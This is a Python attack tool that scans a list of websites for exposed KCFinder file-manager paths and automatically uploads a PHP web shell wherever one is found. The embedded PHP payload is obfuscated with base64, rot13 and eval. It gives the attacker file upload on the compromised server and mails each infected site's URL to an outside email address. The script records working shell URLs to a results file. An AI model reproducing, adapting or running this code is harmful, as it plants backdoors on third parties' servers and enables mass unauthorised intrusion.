import requests
from os import system,chdir,mkdir
from time import sleep
import concurrent.futures
system('clear')
la7mar  = '\033[91m'
la5dhar = '\033[92m'
labyadh = '\033[00m'
green = "\033[0;32m"
red = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
auth = """{} MCA-BD Kcfinder Scanner & AutoShell{}
  ____  _            _      _____  _     _     _     
 |  _ \| |          | |    |  __ \| |   (_)   | |    
 | |_) | | __ _  ___| | __ | |__) | |__  _ ___| |__  
 |  _ <| |/ _` |/ __| |/ / |  ___/| '_ \| / __| '_ \ 
 | |_) | | (_| | (__|   <  | |    | | | | \__ \ | | |
 |____/|_|\__,_|\___|_|\_\ |_|    |_| |_|_|___/_| |_|
                       ______                        
                      |______|                      
        
    		   Version: 1.0.0

   {} We Don’t Responsible For Any illegal Activists {}
    """.format(la7mar,green,la7mar,green)
print(auth)
target = ["kcfinder/","assets/ckeditor/kcfinder/","assets/libs/kcfinder/","panel/kcfinder/","assets/plugins/ckeditor/kcfinder/","admin/ckeditor/kcfinder/","libraries/jscripts/kcfinder/","ckeditor/kcfinder/","js/ckeditor/kcfinder","scripts/jquery/kcfinder/","kcfinder-2.51/","assets/js/mylibs/kcfinder/"]

kcfile = """
<title>Vuln!! patch it Now!</title>
<?php
/*
if You Decode This, Congratulations You Are 1337
Encoded By Black_Phish
*/
eval("?>".base64_decode("PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFy
dCgpOwplY2hvIGJhc2U2NF9kZWNvZGUoIlBDRkVUME5VV1ZCRklHaDBiV3crQ2p4b2RHMXNQZ284
YUdWaFpENEtJQ0E4ZEdsMGJHVStWWEJzYjJGa0lIbHZkWElnWm1sc1pYTTgKTDNScGRHeGxQZ284
TDJobFlXUStDanhpYjJSNVBnb2dJRHhtYjNKdElHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1i
M0p0TFdSaApkR0VpSUdGamRHbHZiajBpSWlCdFpYUm9iMlE5SWxCUFUxUWlQZ29nSUNBZ1BIQStW
WEJzYjJGa0lIbHZkWElnWm1sc1pUd3ZjRDRLCklDQWdJRHhwYm5CMWRDQjBlWEJsUFNKbWFXeGxJ
aUJ1WVcxbFBTSjFjR3h2WVdSbFpGOW1hV3hsSWo0OEwybHVjSFYwUGp4aWNpQXYKUGdvZ0lDQWdQ
R2x1Y0hWMElIUjVjR1U5SW5OMVltMXBkQ0lnZG1Gc2RXVTlJbFZ3Ykc5aFpDSStQQzlwYm5CMWRE
NEtJQ0E4TDJadgpjbTArQ2p3dlltOWtlVDRLUEM5b2RHMXNQZz09Iik7Cj8+"));eval("?>".base64_decode("PD9waHAKCWZ1bmN0aW9uIFhrQWtha0FqVEhzanNhakFqcygkY29kZSl7CgkkY29kZSA9IHN0cl9z
cGxpdCgkY29kZSw1KTsKCSRpID0gMDsKCWZvcmVhY2goJGNvZGUgYXMgJHgpewoJJHggPSBzdHJf
cm90MTMoJHgpOwoJICRibGFja1skaV09ICR4OwoJJGkrKzsKCX0KCSRieXRlcyA9IGh0bWxzcGVj
aWFsY2hhcnNfZGVjb2RlKGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKGltcGxvZGUoJGJsYWNrKSkp
KTsKCWV2YWwoJz8+Jy4kYnl0ZXMpOwoJfQogPz4="));$coded = file(__FILE__);eval("?>".base64_decode("PD9waHAKZnVuY3Rpb24gZml4KCR4KXsKICR4ID0gc3RyX3JlcGxhY2UoIl9faGFsdF9jb21waWxl
cigpOyIsIiIsJHgpOwogcmV0dXJuICR4Owp9CiRYbSA9IGZpeCgkY29kZWRbY291bnQoJGNvZGVk
KS0xXSk7ClhrQWtha0FqVEhzanNhakFqcygkWG0pOwo/Pg=="));
__halt_compiler();Jmx0Oz9QSFANCiAgaWYoIWVtcHR5KCRfRklMRVNbJ3VwbG9hZGVkX2ZpbGUnXSkpDQogIHsNCiAgICAkcGF0aCA9ICZxdW90Oy4vJnF1b3Q7Ow0KICAgICRwYXRoID0gJHBhdGggLiBiYXNlbmFtZSggJF9GSUxFU1sndXBsb2FkZWRfZmlsZSddWyduYW1lJ10pOw0KICAgIGlmKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyd1cGxvYWRlZF9maWxlJ11bJ3RtcF9uYW1lJ10sICRwYXRoKSkgew0KICAgICAgZWNobyAmcXVvdDtUaGUgZmlsZSAmcXVvdDsuICBiYXNlbmFtZSggJF9GSUxFU1sndXBsb2FkZWRfZmlsZSddWyduYW1lJ10pLiANCiAgICAgICZxdW90OyBoYXMgYmVlbiB1cGxvYWRlZCZxdW90OzsNCiAgICB9IGVsc2V7DQogICAgICAgIGVjaG8gJnF1b3Q7VGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB0aGUgZmlsZSwgcGxlYXNlIHRyeSBhZ2FpbiEmcXVvdDs7DQogICAgfQ0KICB9DQogLy9DaGFuZ2UgIFlvdXIgTWFpbA0KIA0KIGlmKCFpc3NldCgkX1NFU1NJT05bJnF1b3Q7dmlzaXQmcXVvdDtdKSl7DQokdXJsID0gICZxdW90O2h0dHA6Ly8mcXVvdDsuICRfU0VSVkVSWydIVFRQX0hPU1QnXS4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokaGVhZGVycyA9ICZxdW90O0Zyb206IHdlYm1hc3RlckBleGFtcGxlLmNvbSZxdW90OzsNCm1haWwoJ3JtMjE3NDcxNEBnbWFpbC5jb20nLCdXb3JkcHJlc3MgTGluayBHZW5lcmF0ZScsJHVybCwkaGVhZGVycyk7DQp9DQokX1NFU1NJT05bJnF1b3Q7dmlzaXQmcXVvdDtdID0gJnF1b3Q7b2smcXVvdDs7DQo
"""
files = {'file': ('blackphish.php5', kcfile.encode('utf-8'))}
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
def scan(x):
	st = x.strip()
	for dork in target:
		link = "http://"+st+"/"+dork
		try:
			r = requests.get(link+"browse.php",timeout=10,headers=headers)
			ripon = r.text
			if "<title>KCFinder: /files</title>" in ripon or "kc_CKEditor" in ripon or "kcact:upload" in ripon:
				sent = "https://"+st+"/"+dork+"upload.php"
				try:
					requests.post(sent,files=files,timeout=10,headers=headers)
					lib = requests.get(link+"upload/files/blackphish.php5",timeout=10,headers=headers)
					if "Vuln!!" in lib.text:
						print(g+" - "+w+st+c+" ---> "+w+" Kcfinder-Shell "+g+"YES!"+w)
						open("result/Shellz.txt","a").write(lib.url+"\n")
					else:
						open("result/kcfinder-path.txt","a").write(link+"browse.php\n")
						print(g+" - "+w+st+c+" ---> "+w+" Kcfinder-Path "+g+"YES!"+w)
				except Exception as e:
					pass
				break
			else:
				print(red+" - "+w+st+"/"+dork+c+" ---> "+w+"Kcfinder"+red+" NO!"+w)
		except Exception as e:
			pass
			print(red+" - "+w+st+"/"+dork+c+" ---> "+w+"Kcfinder"+red+" NO!"+w)
site = input(green+" [+] Enter You Site List: "+la7mar)
th = input(green+" [+] How Many Speed: "+la7mar)
try:
	opn = open(site,"r").readlines()
except:
	print(la7mar+"\n\n [!] Failed To Open List")
	quit()
try:
	mkdir("result")
except:
	pass
try:
	with concurrent.futures.ThreadPoolExecutor(int(th)) as executor:
		executor.map(scan,opn)
except Exception as e:
	print(e)
print(green+" [+] All Site Scanned Successful [+]")